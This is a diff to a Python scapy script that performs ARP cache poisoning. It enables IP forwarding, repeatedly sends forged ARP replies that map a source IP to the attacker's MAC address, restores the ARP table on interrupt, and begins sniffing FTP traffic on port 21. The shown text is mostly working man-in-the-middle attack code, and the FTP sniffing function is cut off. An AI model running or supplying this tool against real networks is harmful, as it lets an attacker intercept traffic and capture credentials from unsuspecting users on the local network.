@@ -3,15 +3,19 @@ import os
 import threading
 import time
 from scapy.all import ARP, Ether, send, sniff, Raw, TCP
+from scapy.all import Ether, ARP, send
 
 def enable_ip_forwarding():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     print("[*] IP forwarding enabled")
 
+
 def poison_target(ip_src, mac_src, ip_target, mac_target, attacker_mac):
     try:
-        print("[*] Starting ARP poisoning (CTRL+C to stop)...")
+        print("[*] Sending forged ARP replies...")
+
         while True:
+            # Tell target: "ip_src is at attacker_mac"
             pkt = Ether(dst=mac_target) / ARP(
                 op=2,
                 pdst=ip_target,
@@ -19,10 +23,11 @@ def poison_target(ip_src, mac_src, ip_target, mac_target, attacker_mac):
                 psrc=ip_src,
                 hwsrc=attacker_mac
             )
-            send(pkt, verbose=False)
+            send(pkt, iface="eth0", verbose=False)  # explicitly set interface
             time.sleep(2)
+
     except KeyboardInterrupt:
-        print("[!] Stopping... Restoring ARP table.")
+        print("\n[!] Interrupted. Restoring ARP...")
         restore_arp(ip_src, mac_src, ip_target, mac_target)
 
 def restore_arp(ip_src, mac_src, ip_target, mac_target):
@@ -33,8 +38,8 @@ def restore_arp(ip_src, mac_src, ip_target, mac_target):
         psrc=ip_src,
         hwsrc=mac_src
     )
-    send(pkt, count=5, verbose=False)
-    print("[*] ARP table restored.")
+    send(pkt, count=5, iface="eth0", verbose=False)
+    print("[*] Restored ARP entry for target.")
 
 def sniff_ftp():
     print("[*] Sniffing FTP traffic on port 21...")
